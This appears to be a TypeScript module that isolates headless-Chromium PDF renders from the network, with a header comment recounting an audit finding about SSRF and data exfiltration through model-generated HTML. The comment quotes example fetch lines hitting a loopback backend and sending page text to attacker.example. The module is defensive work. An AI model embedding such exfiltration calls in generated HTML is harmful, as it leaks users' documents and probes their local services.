/**
 * Egress isolation for every headless-Chromium document render
 * (2026-11-06 audit, finding 7).
 *
 * `POST /api/documents/pdf` accepts RAW MODEL HTML — the ```html artifact's
 * "Export as PDF" button posts the fence body verbatim — and handed it to
 * Chromium with JavaScript and the network enabled. A fence body containing
 * `fetch("http://127.0.0.1:3101/…")` or
 * `fetch("https://attacker.example/?d=" + encodeURIComponent(document.body.innerText))`
 * therefore executed **on the user's own machine at export time**: loopback SSRF
 * against the Rust backend (:3101), the local model endpoint (:8080) and LAN
 * devices, plus exfiltration of the very document being printed. `waitUntil:
 * "networkidle"` made it worse — one pending request, a WebSocket or an
 * EventSource could stall generation to the full 45 s timeout.
 *
 * The rule the repair enforces: **a document render may not reach anything
 * outside its own document.** Every request is refused except the engine's own
 * temp file (the chart-screenshot path, which loads itself over `file://`). The
 * raw-model-HTML path additionally runs in an OFFLINE browser context, because
 * Playwright's route layer does not intercept WebSocket/EventSource handshakes at
 * all — offline mode closes those transports at the network-stack level too.
 *
 * JavaScript deliberately STAYS ON. The dangerous capability was egress, not
 * computation: with no network a script can only reshape its own document, and
 * inline-script artifacts (a canvas chart drawn from data inside the fence) still
 * print correctly. Switching JS off would have silently blanked those exports,
 * and the app's own chart pipeline (`lib/documents/chartHtml.ts`) is inline SVG
 * that never needed JS. `data:`/`blob:` URLs stay available — Chromium does not
 * route them, so inline images and base64 fonts keep working.
 */
import { pathToFileURL } from "node:url";
import type { Page } from "playwright";

/** Handle for the canary tests: how many requests the render tried to make. */
export interface RenderGuard {
  blocked(): number;
}

export interface IsolateOptions {
  /**
   * Absolute path of the engine's own temp HTML, allowed through because the
   * chart screenshot navigates to it. Never set for model-supplied HTML.
   */
  allowLocalFile?: string;
}

/**
 * Canonical `file://` URL for an absolute path. Node's own encoder is the ONLY
 * correct one: a hand-concatenated "file:///" + path is wrong for every
 * URL-reserved character (`#` becomes a fragment, `%` a percent-escape, raw
 * spaces/Unicode get re-encoded by Chromium), so the chart navigation and this
 * guard must both go through `pathToFileURL` — the two sides then agree by
 * construction for ANY path, no special-case branches.
 */
function toFileUrl(p: string): string {
  return pathToFileURL(p).href;
}

/**
 * Installs the egress guard on a page. Installed BEFORE any content is set, so
 * the very first request the document makes is already covered.
 */
export async function isolateRenderPage(page: Page, opts: IsolateOptions = {}): Promise<RenderGuard> {
  let blocked = 0;
  const allowed = opts.allowLocalFile ? toFileUrl(opts.allowLocalFile) : null;

  await page.route("**/*", async (route) => {
    const url = route.request().url();
    // EXACT equality with the canonical URL of the permitted file. The old
    // startsWith() prefix also admitted anything nested under that path
    // (file.html/deep/…) — the policy has always been "its OWN file", and
    // canonicalized equality is what makes that enforceable under special
    // characters, where a raw prefix never matched at all.
    if (allowed && url === allowed) return route.continue();
    if (url.startsWith("data:") || url.startsWith("blob:") || url === "about:blank") return route.continue();
    blocked += 1;
    // "blockedbyclient" is the honest reason: the policy here refused it, so the
    // artifact sees a network error it cannot retry around, not a transient failure.
    return route.abort("blockedbyclient");
  });

  return { blocked: () => blocked };
}

/** Chart screenshots load their own temp file; nothing else may be fetched. */
export function chartPageGuardOptions(tempHtmlPath: string): IsolateOptions {
  return { allowLocalFile: tempHtmlPath };
}
